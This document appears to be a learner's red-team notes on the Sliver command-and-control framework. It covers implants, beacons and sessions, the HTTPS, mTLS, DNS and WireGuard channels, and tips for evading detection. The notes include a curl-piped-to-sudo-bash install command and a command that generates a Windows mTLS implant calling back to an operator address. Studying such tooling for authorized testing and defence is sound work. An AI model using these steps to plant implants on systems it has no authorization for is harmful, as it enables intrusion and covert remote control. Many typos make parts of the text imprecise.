
## Sliver Server

- Single GO binary 
- Milti Oprator - that mens People can Work together on a red team engagement
- Listener Management
- Dynamic Compilation

**WHat is an Implant**
-- it is an Singgle binary that acts as ann agent on the victim machine . you create this using the sliver to gain acccess to the victim



### Communication Models

- Beacons - IT is on the  victim machine and calls back to the accter server listern

sessions gives the attacker shell like experiance

![](../../attchments/Pasted%20image%2020260716235952.png)


## Supported Protocols

### Http/https

use https which is encrypted and download an new certificate form letsencrypt insted of using the sliver self signed cert beacause it can get detected
- Initsal recon
- Simple Relaible

#### Mutual TLS

Encrypted and Implant presensts an VAild client Cert Used in Red Team Engagement can bypass netwrok defences

#### DNS

the commands and data is encode and split into small chunks and placed into DNS queries this is much slower andd steldlhy.Use if others are not working

#### Wireguard

The Sliver implant(On the victim) has the WIreguard VPN and it connects using Encrypted UDP tunnel to C2 server .It is Fast and relaible and this is recommende in most red team engaement
use it UDP traffic Alowed

## how to install SLiver

```
curl https://sliver.sh/install | sudo bash
```

```
sudo systemctl status sliver
```

```
sudo systemctl start sliver
```

```
sudo apt install mingw-w64
```
`THis help in generation shellcode etc etc`

```
sliver
```

#### Slliver First PRactical Creating an MTLS Implant

```
help
help sessions
help generate
help background
help mtls
```

```
generate --mtls lhost(10.2.0.15):lport(443) --save /home/antivenom --os winodws
```


